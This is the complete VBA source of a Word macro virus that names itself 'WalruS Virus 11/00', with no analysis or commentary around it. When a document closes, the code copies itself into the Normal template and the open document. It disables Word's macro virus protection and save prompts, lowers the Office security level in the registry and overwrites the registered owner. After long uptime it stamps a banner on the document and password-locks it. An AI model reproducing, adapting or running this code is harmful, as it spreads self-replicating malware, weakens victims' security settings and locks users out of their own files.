   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Declare Function GetTickCount Lib "Kernel32" () As Long
   Private Sub Document_Close()
   ' WalruS Virus 11/00
       On Error Resume Next
       If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
       DropPath = ("C:\WalruS.drv")
       RunTime = Format(GetTickCount / 60000, "0")
       VBProject.VBComponents(1).Export DropPath
       Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
       Options.VirusProtection = False: Options.SaveNormalPrompt = False: Application.DisplayStatusBar = False
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
       System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "WalruS"
       If nt.CountOfLines = 0 Then
           nt.AddFromFile DropPath: nt.DeleteLines 1, 4: nt.replaceline 30, "Sub ToolsMacro(): End Sub"
       End If
       If ad.CountOfLines = 0 Then
           ad.AddFromFile DropPath: ad.DeleteLines 1, 4: ad.replaceline 30, "Sub ViewVBCode(): End Sub"
           ActiveDocument.Save
       End If
       If RunTime > 300 Then
           Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
           ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, "The WalruS", _
               "Arial Black", 72#, msoFalse, msoFalse, 73.75, 129.3).Select
           ActiveDocument.Protect Password:=Application.UserName, NoReset:=False, Type:= _
               wdAllowOnlyComments
           ActiveDocument.Save
       End If
       Kill DropPath
   End Sub
    Sub ViewVBCode(): End Sub
